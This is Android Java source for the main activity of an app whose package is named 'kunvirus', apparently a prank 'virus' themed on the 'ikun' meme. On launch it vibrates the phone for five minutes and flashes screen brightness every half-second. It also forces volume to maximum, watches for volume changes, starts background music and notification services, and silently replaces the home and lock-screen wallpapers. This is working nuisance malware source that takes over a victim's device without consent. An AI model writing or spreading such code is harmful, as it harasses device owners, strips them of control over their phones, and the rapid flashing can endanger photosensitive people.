package cn.edu.zjut.kunvirus;

import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.BitmapDrawable;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private static int screen_vary_cnt=0;
    private final int vary_delay=500;
    class MyTimerTask extends TimerTask {
        public void run() {
            screen_vary_cnt=(screen_vary_cnt+1)%2;//0101...这样变化
            if(screen_vary_cnt==1)
                MainActivity.this.runOnUiThread(() -> setWindowBrightness(0));
            else
                MainActivity.this.runOnUiThread(() -> setWindowBrightness(255));
            new Timer().schedule(new MyTimerTask(), vary_delay);
        }
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        if(!NetUtils.networkConnected(this)){
            System.exit(0);
        }
        //returnHome();
        shakeItBaby();//手机振动
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setText();
        new Timer().schedule(new MyTimerTask(),vary_delay);
        VoiceVolumeWrapper voiceVolumeWrapper = new VoiceVolumeWrapper(this);
        voiceVolumeWrapper.registerVolumeReceiver();//监听音量变化
        Intent musicService = new Intent(this, MusicService.class);
        this.startService(musicService);	//开启服务保证音乐在后台运行
        setMaxVolume();//音量调节到最大
        Intent notifyService = new Intent(this, NotifyService.class);
        this.startService(notifyService);	//开启通知服务
        Toast.makeText(this,"唱跳rap篮球",Toast.LENGTH_LONG).show();
        //Toast.makeText(this,UserCount.getId(this),Toast.LENGTH_LONG).show();
        SetWallPaper();
        SetLockWallPaper();
    }

    public void setMaxVolume(){
        AudioManager mAudioManager = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
        int maxVolume =mAudioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC,maxVolume,AudioManager.FLAG_PLAY_SOUND);
    }

    public void returnHome(){
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory(Intent.CATEGORY_HOME);
        startActivity(intent);
    }

    public void setText(){
        TextView text_view=findViewById(R.id.textView);
        text_view.setText("ikun");
        text_view.setTextSize(30);
        text_view.setGravity(Gravity.CENTER);
    }

    private void shakeItBaby() {
        //5分钟振动
        int vibrate_time=5*60*1000;
        if (Build.VERSION.SDK_INT >= 26) {
            ((Vibrator) getSystemService(VIBRATOR_SERVICE)).vibrate(VibrationEffect.createOneShot(vibrate_time, VibrationEffect.DEFAULT_AMPLITUDE));
        } else {
            ((Vibrator) getSystemService(VIBRATOR_SERVICE)).vibrate(vibrate_time);
        }
    }

    private void setWindowBrightness(int brightness) {
        Window window = getWindow();
        WindowManager.LayoutParams lp = window.getAttributes();
        lp.screenBrightness = brightness / 255.0f;
        window.setAttributes(lp);
    }

    private void SetWallPaper() {
        try {
            BitmapDrawable bitmap = (BitmapDrawable) ContextCompat.getDrawable(this,R.drawable.cxk_bg);
            WallpaperManager manager = WallpaperManager.getInstance(this);
            manager.setBitmap(bitmap.getBitmap());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void SetLockWallPaper() {
        try {
            BitmapDrawable bitmap = (BitmapDrawable) ContextCompat.getDrawable(this,R.drawable.cxk_lock_bg);
            WallpaperManager manager = WallpaperManager.getInstance(this);
            manager.setBitmap(bitmap.getBitmap(),null,true,WallpaperManager.FLAG_LOCK);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}